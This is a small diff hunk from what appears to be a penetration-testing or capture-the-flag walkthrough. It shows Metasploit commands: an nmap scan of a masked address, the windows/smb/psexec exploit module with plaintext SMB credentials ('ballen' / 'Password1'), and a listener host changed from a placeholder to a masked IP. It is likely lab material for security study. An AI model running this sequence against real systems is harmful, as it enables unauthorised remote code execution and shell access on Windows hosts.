@@ -90,7 +90,7 @@ msfconsole
 db_nmap -A -vv -T4 -oN initial 1*.**.***.***
 user exploit/windows/smb/psexec
 hosts -R
-set lhost <localhost>
+set lhost 1*.*.**.**
 set smbuser ballen
 set smbpass Password1
 run
